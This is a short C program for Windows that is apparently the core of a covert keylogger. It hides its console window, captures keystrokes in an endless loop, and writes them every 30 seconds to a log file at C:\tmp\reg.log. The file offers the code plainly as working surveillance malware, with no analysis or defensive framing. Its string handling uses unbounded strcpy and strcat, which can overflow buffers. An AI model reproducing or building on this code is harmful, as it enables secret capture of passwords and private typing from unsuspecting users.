#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <stdbool.h>
#include <string.h>

#include "virtualKeyboard.h"
#include "file.h"
#include "timer.h"
#include "advstring.h"
#include "console.h"

#define REGISTER_INTERVAL 30
#define REGISTER_FILE "C:\\tmp\\reg.log"

static char pressedKeys[5000];

static void listenToKeypress() {    
    char buffer[7];
    strcpy(buffer, virtualKeyboard_translate());
    
    if (!advstring_isEmpty(buffer)) {
        strcat(pressedKeys, buffer);
    }
    
    advstring_clear(buffer);
}

static void writeRegisteredKeysToFile() {
    if (!file_exists(REGISTER_FILE)) {
        file_create(REGISTER_FILE);
    }
    
    file_write(REGISTER_FILE, pressedKeys);
}

int main(int argc, char** argv) {
    console_hide();
    
    while(true) {
        timer_start(REGISTER_INTERVAL, listenToKeypress);
        writeRegisteredKeysToFile();
        advstring_clear(pressedKeys);
    }
    
    return (EXIT_SUCCESS);
}
